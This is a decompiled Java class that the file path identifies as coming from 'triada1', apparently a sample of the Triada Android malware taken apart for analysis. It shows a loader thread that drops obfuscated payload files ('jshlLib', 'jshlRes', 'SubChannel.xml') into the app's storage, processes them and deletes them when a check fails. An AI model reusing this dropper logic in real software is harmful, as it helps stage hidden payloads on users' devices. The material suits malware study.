package com.android.xb.start;

import android.content.Context;
import b.b;
import e.b;
import java.io.File;

class start$1 extends Thread {
  start$1(start paramstart, Context paramContext, String paramString) {}
  
  public void run() {
    if (start.access$000()) {
      b.c("Start is running!");
      return;
    } 
    start.access$002(true);
    start.a = this.a;
    File file = this.a.getFilesDir();
    b.a(this.b, file.getAbsolutePath() + File.separator + "jshlLib", "jshlLib");
    b.a(this.b, file.getAbsolutePath() + File.separator + "jshlRes", "jshlRes");
    b.a(this.b, file.getAbsolutePath() + File.separator + "SubChannel.xml", "SubChannel.xml");
    b.a(file.getAbsolutePath() + File.separator + "jshlLib");
    b.b(file.getAbsolutePath() + File.separator + "SubChannel.xml");
    if (!b.l(this.a)) {
      File file1 = new File(file.getAbsolutePath() + File.separator + "jshlLib");
      if (file1.exists())
        file1.delete(); 
      file = new File(file.getAbsolutePath() + File.separator + "jshlRes");
      if (file.exists())
        file.delete(); 
    } 
    start.access$002(false);
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/xb/start/start$1.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */